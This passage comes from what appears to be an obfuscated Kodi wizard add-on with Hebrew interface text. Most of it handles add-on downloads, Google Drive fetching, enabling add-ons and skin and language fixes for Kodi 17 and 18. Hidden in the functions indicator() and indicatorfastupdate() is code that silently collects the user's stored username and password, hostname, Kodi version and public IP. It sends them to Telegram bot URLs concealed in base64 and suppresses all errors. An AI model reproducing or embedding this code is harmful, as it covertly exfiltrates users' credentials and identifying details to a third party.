        if (time .time ()-O000O000OO0OOOO00 )>0 :#line:3481
          O0O0O00OOOOO000OO =OOO0OOO0000OO0000 /(time .time ()-O000O000OO0OOOO00 )#line:3482
          O0O0O00OOOOO000OO =O0O0O00OOOOO000OO /1024 #line:3483
        else :#line:3484
         O0O0O00OOOOO000OO =0 #line:3485
        OOOOOOOO0OO00OO00 ='KB'#line:3486
        if O0O0O00OOOOO000OO >=1024 :#line:3487
           O0O0O00OOOOO000OO =O0O0O00OOOOO000OO /1024 #line:3488
           OOOOOOOO0OO00OO00 ='MB'#line:3489
        if O0O0O00OOOOO000OO >0 and not O000OO0OOOOO0OO00 ==100 :#line:3490
            OOO0O00O0O0O0OOOO =(O0O0O00OO00O0OOO0 -OOO0OOO0000OO0000 )/O0O0O00OOOOO000OO #line:3491
        else :#line:3492
            OOO0O00O0O0O0OOOO =0 #line:3493
        O0O0OO0O000OO0OO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O0O00OOOOO000OO ,OOOOOOOO0OO00OO00 )#line:3494
        O0O000O00OO000O0O .update (int (O000OO0OOOOO0OO00 ),"Downloading "+name ,O00OO0O0OOO0O000O ,O0O0OO0O000OO0OO0 )#line:3496
  OOOO0O00OO0O000OO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3499
  O0000O00OO0OO0OOO .close ()#line:3501
  extract (O0OO00O00000OOO00 ,OOOO0O00OO0O000OO ,O0O000O00OO000O0O )#line:3503
  if os .path .exists (OOOO0O00OO0O000OO +'/scakemyer-script.quasar.burst'):#line:3504
    if os .path .exists (OOOO0O00OO0O000OO +'/script.quasar.burst'):#line:3505
     shutil .rmtree (OOOO0O00OO0O000OO +'/script.quasar.burst',ignore_errors =False )#line:3506
    os .rename (OOOO0O00OO0O000OO +'/scakemyer-script.quasar.burst',OOOO0O00OO0O000OO +'/script.quasar.burst')#line:3507
  if os .path .exists (OOOO0O00OO0O000OO +'/plugin.video.kmediatorrent-master'):#line:3509
    if os .path .exists (OOOO0O00OO0O000OO +'/plugin.video.kmediatorrent'):#line:3510
     shutil .rmtree (OOOO0O00OO0O000OO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3511
    os .rename (OOOO0O00OO0O000OO +'/plugin.video.kmediatorrent-master',OOOO0O00OO0O000OO +'/plugin.video.kmediatorrent')#line:3512
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3513
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3514
  try :#line:3515
    os .remove (O0OO00O00000OOO00 )#line:3516
  except :#line:3517
    pass #line:3518
  O0O000O00OO000O0O .close ()#line:3519
def dis_or_enable_addon (OO0O00O0O0O0OO000 ,O0OOO00OO0OOOOO0O ,enable ="true"):#line:3520
    import json #line:3521
    O00OOO00O0OO0OO00 ='"%s"'%OO0O00O0O0O0OO000 #line:3522
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O00O0O0O0OO000 )and enable =="true":#line:3523
        logging .warning ('already Enabled')#line:3524
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0O00O0O0O0OO000 )#line:3525
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O00O0O0O0OO000 )and enable =="false":#line:3526
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0O00O0O0O0OO000 )#line:3527
    else :#line:3528
        OOO0O0OOOOOO0O0OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00OOO00O0OO0OO00 ,enable )#line:3529
        O00O0O0OO0O000OO0 =xbmc .executeJSONRPC (OOO0O0OOOOOO0O0OO )#line:3530
        OO0O000000OOO0O0O =json .loads (O00O0O0OO0O000OO0 )#line:3531
        if enable =="true":#line:3532
            xbmc .log ("### Enabled %s, response = %s"%(OO0O00O0O0O0OO000 ,OO0O000000OOO0O0O ))#line:3533
        else :#line:3534
            xbmc .log ("### Disabled %s, response = %s"%(OO0O00O0O0O0OO000 ,OO0O000000OOO0O0O ))#line:3535
    if O0OOO00OO0OOOOO0O =='auto':#line:3536
     return True #line:3537
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3538
def chunk_report (OO000OO00OO000OOO ,OO0O0O0O000OOO00O ,O0O0O000O00OO000O ):#line:3539
   O000OOOOO0O0O0000 =float (OO000OO00OO000OOO )/O0O0O000O00OO000O #line:3540
   O000OOOOO0O0O0000 =round (O000OOOOO0O0O0000 *100 ,2 )#line:3541
   if OO000OO00OO000OOO >=O0O0O000O00OO000O :#line:3543
      sys .stdout .write ('\n')#line:3544
def chunk_read (OOOO0OOOOO000O00O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3546
   import time #line:3547
   OO0O0OO0O0O0O000O =int (filesize )*1000000 #line:3548
   O000O00OO0OOOO000 =0 #line:3550
   OOOO000O000OO0OO0 =time .time ()#line:3551
   O0OOO0O00O0OO000O =0 #line:3552
   logging .warning ('Downloading')#line:3554
   with open (destination ,"wb")as OOOOO0000O0OO0O0O :#line:3555
    while 1 :#line:3556
      OOO00000000OOO000 =time .time ()-OOOO000O000OO0OO0 #line:3557
      OOOOO00000O000O0O =int (O0OOO0O00O0OO000O *chunk_size )#line:3558
      O00OOOO0O00O0OO0O =OOOO0OOOOO000O00O .read (chunk_size )#line:3559
      OOOOO0000O0OO0O0O .write (O00OOOO0O00O0OO0O )#line:3560
      OOOOO0000O0OO0O0O .flush ()#line:3561
      O000O00OO0OOOO000 +=len (O00OOOO0O00O0OO0O )#line:3562
      O000OO0O000OO0OOO =float (O000O00OO0OOOO000 )/OO0O0OO0O0O0O000O #line:3563
      O000OO0O000OO0OOO =round (O000OO0O000OO0OOO *100 ,2 )#line:3564
      if int (OOO00000000OOO000 )>0 :#line:3565
        OO00O0O00O0O0O0O0 =int (OOOOO00000O000O0O /(1024 *OOO00000000OOO000 ))#line:3566
      else :#line:3567
         OO00O0O00O0O0O0O0 =0 #line:3568
      if OO00O0O00O0O0O0O0 >1024 and not O000OO0O000OO0OOO ==100 :#line:3569
          O000O00000O0000O0 =int (((OO0O0OO0O0O0O000O -OOOOO00000O000O0O )/1024 )/(OO00O0O00O0O0O0O0 ))#line:3570
      else :#line:3571
          O000O00000O0000O0 =0 #line:3572
      if O000O00000O0000O0 <0 :#line:3573
        O000O00000O0000O0 =0 #line:3574
      dp .update (int (O000OO0O000OO0OOO ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O000OO0O000OO0OOO ,OOOOO00000O000O0O /(1024 *1024 ),OO0O0OO0O0O0O000O /(1000 *1000 ),OO00O0O00O0O0O0O0 ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O000O00000O0000O0 ,60 ))#line:3575
      if dp .iscanceled ():#line:3576
         dp .close ()#line:3577
         break #line:3578
      if not O00OOOO0O00O0OO0O :#line:3579
         break #line:3580
      if report_hook :#line:3582
         report_hook (O000O00OO0OOOO000 ,chunk_size ,OO0O0OO0O0O0O000O )#line:3583
      O0OOO0O00O0OO000O +=1 #line:3584
   logging .warning ('END Downloading')#line:3585
   return O000O00OO0OOOO000 #line:3586
def googledrive_download (OO00O0OO000O0O0O0 ,OO0O000O0OO0OO000 ,OOO0OOOO0000O0O00 ,OO000000O0O0OOO0O ):#line:3588
    O0O0O0O00000O0OO0 =[]#line:3592
    O0O000O0OOOOO0O00 =OO00O0OO000O0O0O0 .split ('=')#line:3593
    OO00O0OO000O0O0O0 =O0O000O0OOOOO0O00 [len (O0O000O0OOOOO0O00 )-1 ]#line:3594
    def O0O0OO0OO0OOO0000 (O00O000000O00OO0O ):#line:3596
        for OOOOO0OOO000O0O0O in O00O000000O00OO0O :#line:3598
            logging .warning ('cookie.name')#line:3599
            logging .warning (OOOOO0OOO000O0O0O .name )#line:3600
            O00000000OO000000 =OOOOO0OOO000O0O0O .value #line:3601
            if 'download_warning'in OOOOO0OOO000O0O0O .name :#line:3602
                logging .warning (OOOOO0OOO000O0O0O .value )#line:3603
                logging .warning ('cookie.value')#line:3604
                return OOOOO0OOO000O0O0O .value #line:3605
            return O00000000OO000000 #line:3606
        return None #line:3608
    def O00OOOO000OO0OO00 (OO00000O00O0O000O ,O00OO000O00OO0OOO ):#line:3610
        O0O0OOO00OOOO0O0O =32768 #line:3612
        OO0OO0O0O0O0OO000 =time .time ()#line:3613
        with open (O00OO000O00OO0OOO ,"wb")as O00O0O00O0O0O0O00 :#line:3615
            O000OO000O00OOOOO =1 #line:3616
            O0O0OOO0OO0O00OOO =32768 #line:3617
            try :#line:3618
                O0O0O00O0O0OO0O0O =int (OO00000O00O0O000O .headers .get ('content-length'))#line:3619
                print ('file total size :',O0O0O00O0O0OO0O0O )#line:3620
            except TypeError :#line:3621
                print ('using dummy length !!!')#line:3622
                O0O0O00O0O0OO0O0O =int (OO000000O0O0OOO0O )*1000000 #line:3623
            for O0OO00O0O00OOOOO0 in OO00000O00O0O000O .iter_content (O0O0OOO00OOOO0O0O ):#line:3624
                if O0OO00O0O00OOOOO0 :#line:3625
                    O00O0O00O0O0O0O00 .write (O0OO00O0O00OOOOO0 )#line:3626
                    O00O0O00O0O0O0O00 .flush ()#line:3627
                    O00O0OO000000O00O =time .time ()-OO0OO0O0O0O0OO000 #line:3628
                    OOO00O0OO00000OOO =int (O000OO000O00OOOOO *O0O0OOO0OO0O00OOO )#line:3629
                    if O00O0OO000000O00O ==0 :#line:3630
                        O00O0OO000000O00O =0.1 #line:3631
                    O0OO0OO00OOO0OOOO =int (OOO00O0OO00000OOO /(1024 *O00O0OO000000O00O ))#line:3632
                    OOO0O00O000OO00O0 =int (O000OO000O00OOOOO *O0O0OOO0OO0O00OOO *100 /O0O0O00O0O0OO0O0O )#line:3633
                    if O0OO0OO00OOO0OOOO >1024 and not OOO0O00O000OO00O0 ==100 :#line:3634
                      OO00O00OOOO0OO0OO =int (((O0O0O00O0O0OO0O0O -OOO00O0OO00000OOO )/1024 )/(O0OO0OO00OOO0OOOO ))#line:3635
                    else :#line:3636
                      OO00O00OOOO0OO0OO =0 #line:3637
                    OOO0OOOO0000O0O00 .update (int (OOO0O00O000OO00O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO0O00O000OO00O0 ,OOO00O0OO00000OOO /(1024 *1024 ),O0O0O00O0O0OO0O0O /(1000 *1000 ),O0OO0OO00OOO0OOOO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO00O00OOOO0OO0OO ,60 ))#line:3639
                    O000OO000O00OOOOO +=1 #line:3640
                    if OOO0OOOO0000O0O00 .iscanceled ():#line:3641
                     OOO0OOOO0000O0O00 .close ()#line:3642
                     break #line:3643
    OO0O0OO0OOOOOO00O ="https://docs.google.com/uc?export=download"#line:3644
    import urllib2 #line:3649
    import cookielib #line:3650
    from cookielib import CookieJar #line:3652
    OO000OO0O0O0OOOOO =CookieJar ()#line:3654
    O00O0OOOO00OOO000 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO000OO0O0O0OOOOO ))#line:3655
    OO0O0O0OO00O0OOOO ={'id':OO00O0OO000O0O0O0 }#line:3657
    OO000OO00O0O0O000 =urllib .urlencode (OO0O0O0OO00O0OOOO )#line:3658
    logging .warning (OO0O0OO0OOOOOO00O +'&'+OO000OO00O0O0O000 )#line:3659
    OO0O0OO000OO0O00O =O00O0OOOO00OOO000 .open (OO0O0OO0OOOOOO00O +'&'+OO000OO00O0O0O000 )#line:3660
    OOO0O00OOO000OOOO =OO0O0OO000OO0O00O .read ()#line:3661
    for OO0OO000OOO00O00O in OO000OO0O0O0OOOOO :#line:3663
         logging .warning (OO0OO000OOO00O00O )#line:3664
    OO0OO00OOOO0OOO0O =O0O0OO0OO0OOO0000 (OO000OO0O0O0OOOOO )#line:3665
    logging .warning (OO0OO00OOOO0OOO0O )#line:3666
    if OO0OO00OOOO0OOO0O :#line:3667
        O00O000O0OOOOO0OO ={'id':OO00O0OO000O0O0O0 ,'confirm':OO0OO00OOOO0OOO0O }#line:3668
        O0O0000OO000OO00O ={'Access-Control-Allow-Headers':'Content-Length'}#line:3669
        OO000OO00O0O0O000 =urllib .urlencode (O00O000O0OOOOO0OO )#line:3670
        OO0O0OO000OO0O00O =O00O0OOOO00OOO000 .open (OO0O0OO0OOOOOO00O +'&'+OO000OO00O0O0O000 )#line:3671
        chunk_read (OO0O0OO000OO0O00O ,report_hook =chunk_report ,dp =OOO0OOOO0000O0O00 ,destination =OO0O000O0OO0OO000 ,filesize =OO000000O0O0OOO0O )#line:3672
    return (O0O0O0O00000O0OO0 )#line:3676
def kodi17Fix ():#line:3677
	O0OO000OO0OOO0O00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3678
	O0OO0000O0OOO0OO0 =[]#line:3679
	for O00O000OOOOOO0000 in sorted (O0OO000OO0OOO0O00 ,key =lambda OOO0OOO0OO0O0O00O :OOO0OOO0OO0O0O00O ):#line:3680
		OOOO00000O0O0O0O0 =os .path .join (O00O000OOOOOO0000 ,'addon.xml')#line:3681
		if os .path .exists (OOOO00000O0O0O0O0 ):#line:3682
			O00O0000000OO0OOO =O00O000OOOOOO0000 .replace (ADDONS ,'')[1 :-1 ]#line:3683
			OO0O000OO0O00O0O0 =open (OOOO00000O0O0O0O0 )#line:3684
			OO00000O00OOOO000 =OO0O000OO0O00O0O0 .read ()#line:3685
			OO00OOO000OO0000O =parseDOM (OO00000O00OOOO000 ,'addon',ret ='id')#line:3686
			OO0O000OO0O00O0O0 .close ()#line:3687
			try :#line:3688
				OOOO0O0OOO0O0O00O =xbmcaddon .Addon (id =OO00OOO000OO0000O [0 ])#line:3689
			except :#line:3690
				try :#line:3691
					log ("%s was disabled"%OO00OOO000OO0000O [0 ],xbmc .LOGDEBUG )#line:3692
					O0OO0000O0OOO0OO0 .append (OO00OOO000OO0000O [0 ])#line:3693
				except :#line:3694
					try :#line:3695
						log ("%s was disabled"%O00O0000000OO0OOO ,xbmc .LOGDEBUG )#line:3696
						O0OO0000O0OOO0OO0 .append (O00O0000000OO0OOO )#line:3697
					except :#line:3698
						if len (OO00OOO000OO0000O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00O0000000OO0OOO ,xbmc .LOGERROR )#line:3699
						else :log ("Unabled to enable: %s"%O00O000OOOOOO0000 ,xbmc .LOGERROR )#line:3700
	if len (O0OO0000O0OOO0OO0 )>0 :#line:3701
		OO000OOO00OOO00O0 =0 #line:3702
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3703
		for OOOOOOOOOO00O00O0 in O0OO0000O0OOO0OO0 :#line:3704
			OO000OOO00OOO00O0 +=1 #line:3705
			OO0OOOO000O0O0OOO =int (percentage (OO000OOO00OOO00O0 ,len (O0OO0000O0OOO0OO0 )))#line:3706
			DP .update (OO0OOOO000O0O0OOO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOOOOO00O00O0 ))#line:3707
			addonDatabase (OOOOOOOOOO00O00O0 ,1 )#line:3708
			if DP .iscanceled ():break #line:3709
		if DP .iscanceled ():#line:3710
			DP .close ()#line:3711
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3712
			sys .exit ()#line:3713
		DP .close ()#line:3714
	forceUpdate ()#line:3715
def indicator ():#line:3717
       try :#line:3718
          import json #line:3719
          wiz .log ('FRESH MESSAGE')#line:3720
          OO0OOOO00OOO0OO0O =(ADDON .getSetting ("user"))#line:3721
          OO0O0O00O0OOO000O =(ADDON .getSetting ("pass"))#line:3722
          OO0O0OOO00O0O0OOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3723
          O00000OOO0OO0OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3724
          OOO0OOOO00000OOO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3725
          OOO000000OOO0O0OO =str (json .loads (OOO0OOOO00000OOO0 )['ip'])#line:3726
          O00O00OOOO00O0O0O =OO0OOOO00OOO0OO0O #line:3727
          O0O000OO0OOOO0OO0 =OO0O0O00O0OOO000O #line:3728
          import socket #line:3729
          OOO0OOOO00000OOO0 =urllib2 .urlopen (O00000OOO0OO0OO00 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00O00OOOO00O0O0O +' - '+O0O000OO0OOOO0OO0 +' - '+OO0O0OOO00O0O0OOO +' - '+OOO000000OOO0O0OO ).readlines ()#line:3730
       except :pass #line:3732
def indicatorfastupdate ():#line:3734
       try :#line:3735
          import json #line:3736
          wiz .log ('FRESH MESSAGE')#line:3737
          O0O0O00O0O00O0OO0 =(ADDON .getSetting ("user"))#line:3738
          O000OOOO00O0O00O0 =(ADDON .getSetting ("pass"))#line:3739
          OO0OOO0000OO0OO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3740
          OO0O000O0O000000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3742
          O0OO0OOO00O00O0OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3743
          OO0OO0OOOOOO0OOOO =str (json .loads (O0OO0OOO00O00O0OO )['ip'])#line:3744
          O000OO000O00OO000 =O0O0O00O0O00O0OO0 #line:3745
          O0OOO0OO0O000000O =O000OOOO00O0O00O0 #line:3746
          import socket #line:3748
          O0OO0OOO00O00O0OO =urllib2 .urlopen (OO0O000O0O000000O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O000OO000O00OO000 +' - '+O0OOO0OO0O000000O +' - '+OO0OOO0000OO0OO00 +' - '+OO0OO0OOOOOO0OOOO ).readlines ()#line:3749
       except :pass #line:3751
def skinfix18 ():#line:3753
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3754
		O0O00OO00O0OOO0O0 =wiz .workingURL (SKINID18DDONXML )#line:3755
		if O0O00OO00O0OOO0O0 ==True :#line:3756
			O0000O0OO0000O00O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3757
			if len (O0000O0OO0000O00O )>0 :#line:3758
				OOO00O0O0000OO00O ='%s-%s.zip'%(SKINID18 ,O0000O0OO0000O00O [0 ])#line:3759
				OOO00OOO000O0O000 =wiz .workingURL (SKIN18ZIPURL +OOO00O0O0000OO00O )#line:3760
				if OOO00OOO000O0O000 ==True :#line:3761
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3762
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3763
					OOO0O0O0OO0O000O0 =os .path .join (PACKAGES ,OOO00O0O0000OO00O )#line:3764
					try :os .remove (OOO0O0O0OO0O000O0 )#line:3765
					except :pass #line:3766
					downloader .download (SKIN18ZIPURL +OOO00O0O0000OO00O ,OOO0O0O0OO0O000O0 ,DP )#line:3767
					extract .all (OOO0O0O0OO0O000O0 ,HOME ,DP )#line:3768
					try :#line:3769
						OO00O0O00OO00O000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3770
						O0OOO0OOO0OOO00O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3771
						os .rename (OO00O0O00OO00O000 ,O0OOO0OOO0OOO00O0 )#line:3772
					except :#line:3773
						pass #line:3774
					try :#line:3775
						O00O000O0000OOOO0 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OOOO00000O0OOOOOO =O00O000O0000OOOO0 .read ();O00O000O0000OOOO0 .close ()#line:3776
						O0O00000OOO0OO00O =wiz .parseDOM (OOOO00000O0OOOOOO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3777
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00000OOO0OO00O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3778
					except :#line:3779
						pass #line:3780
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3781
					DP .close ()#line:3782
					xbmc .sleep (500 )#line:3783
					wiz .forceUpdate (True )#line:3784
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3785
				else :#line:3786
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3787
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOO00OOO000O0O000 ,xbmc .LOGERROR )#line:3788
			else :#line:3789
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3790
		else :#line:3791
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3792
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3793
def skinfix17 ():#line:3794
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3795
		OO00OOOOO0OOOO000 =wiz .workingURL (SKINID17DDONXML )#line:3796
		if OO00OOOOO0OOOO000 ==True :#line:3797
			O0O00O00O00OOO00O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3798
			if len (O0O00O00O00OOO00O )>0 :#line:3799
				OO000000O0OOO00O0 ='%s-%s.zip'%(SKINID17 ,O0O00O00O00OOO00O [0 ])#line:3800
				O00O0O00OOO0O0O00 =wiz .workingURL (SKIN17ZIPURL +OO000000O0OOO00O0 )#line:3801
				if O00O0O00OOO0O0O00 ==True :#line:3802
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3803
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3804
					O0OO0O00O00000000 =os .path .join (PACKAGES ,OO000000O0OOO00O0 )#line:3805
					try :os .remove (O0OO0O00O00000000 )#line:3806
					except :pass #line:3807
					downloader .download (SKIN17ZIPURL +OO000000O0OOO00O0 ,O0OO0O00O00000000 ,DP )#line:3808
					extract .all (O0OO0O00O00000000 ,HOME ,DP )#line:3809
					try :#line:3810
						O00O0OOOO00O00OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3811
						OOOO0OO00OOOO0OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3812
						os .rename (O00O0OOOO00O00OOO ,OOOO0OO00OOOO0OOO )#line:3813
					except :#line:3814
						pass #line:3815
					try :#line:3816
						OO00OOOOOO000OOO0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OOOOO00000OO0O00O =OO00OOOOOO000OOO0 .read ();OO00OOOOOO000OOO0 .close ()#line:3817
						OO0O00OOO00O0O0OO =wiz .parseDOM (OOOOO00000OO0O00O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3818
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O00OOO00O0O0OO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3819
					except :#line:3820
						pass #line:3821
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3822
					DP .close ()#line:3823
					xbmc .sleep (500 )#line:3824
					wiz .forceUpdate (True )#line:3825
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3826
				else :#line:3827
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3828
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00O0O00OOO0O0O00 ,xbmc .LOGERROR )#line:3829
			else :#line:3830
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3831
		else :#line:3832
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3833
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3834
def fix17update ():#line:3835
	if KODIV >=17 and KODIV <18 :#line:3836
		wiz .kodi17Fix ()#line:3837
		xbmc .sleep (4000 )#line:3838
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3839
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3840
		fixfont ()#line:3841
		O00O0O0OO0O0OO000 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3842
		try :#line:3844
			O00OOOOOO00OOOOO0 =open (O00O0O0OO0O0OO000 ,'r')#line:3845
			OOOO0O00O0OOO0OOO =O00OOOOOO00OOOOO0 .read ()#line:3846
			O00OOOOOO00OOOOO0 .close ()#line:3847
			O00O0OOOO0OOOOO0O ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3848
			O000O0O00O0O00000 =re .compile (O00O0OOOO0OOOOO0O ).findall (OOOO0O00O0OOO0OOO )[0 ]#line:3849
			O00OOOOOO00OOOOO0 =open (O00O0O0OO0O0OO000 ,'w')#line:3850
			O00OOOOOO00OOOOO0 .write (OOOO0O00O0OOO0OOO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O000O0O00O0O00000 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3851
			O00OOOOOO00OOOOO0 .close ()#line:3852
		except :#line:3853
				pass #line:3854
		wiz .kodi17Fix ()#line:3855
		O00O0O0OO0O0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3856
		try :#line:3857
			O00OOOOOO00OOOOO0 =open (O00O0O0OO0O0OO000 ,'r')#line:3858
			OOOO0O00O0OOO0OOO =O00OOOOOO00OOOOO0 .read ()#line:3859
			O00OOOOOO00OOOOO0 .close ()#line:3860
			O00O0OOOO0OOOOO0O ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3861
			O000O0O00O0O00000 =re .compile (O00O0OOOO0OOOOO0O ).findall (OOOO0O00O0OOO0OOO )[0 ]#line:3862
			O00OOOOOO00OOOOO0 =open (O00O0O0OO0O0OO000 ,'w')#line:3863
			O00OOOOOO00OOOOO0 .write (OOOO0O00O0OOO0OOO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O000O0O00O0O00000 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3864
			O00OOOOOO00OOOOO0 .close ()#line:3865
		except :#line:3866
				pass #line:3867
		swapSkins ('skin.Premium.mod')#line:3868
def fix18update ():#line:3870
	if KODIV >=18 :#line:3871
		xbmc .sleep (4000 )#line:3872
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3873
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3874
		fixfont ()#line:3875
		O000000O000OO0O0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3876
		try :#line:3877
			O000OO00O0OO0O0O0 =open (O000000O000OO0O0O ,'r')#line:3878
			OOOOO0O0000OOOOO0 =O000OO00O0OO0O0O0 .read ()#line:3879
			O000OO00O0OO0O0O0 .close ()#line:3880
			OOOOOOOOO0OO0OO00 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3881
			O0OOO0O00O0OO00OO =re .compile (OOOOOOOOO0OO0OO00 ).findall (OOOOO0O0000OOOOO0 )[0 ]#line:3882
			O000OO00O0OO0O0O0 =open (O000000O000OO0O0O ,'w')#line:3883
			O000OO00O0OO0O0O0 .write (OOOOO0O0000OOOOO0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0OOO0O00O0OO00OO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3884
			O000OO00O0OO0O0O0 .close ()#line:3885
		except :#line:3886
				pass #line:3887
		wiz .kodi17Fix ()#line:3888
		O000000O000OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3889
		try :#line:3890
			O000OO00O0OO0O0O0 =open (O000000O000OO0O0O ,'r')#line:3891
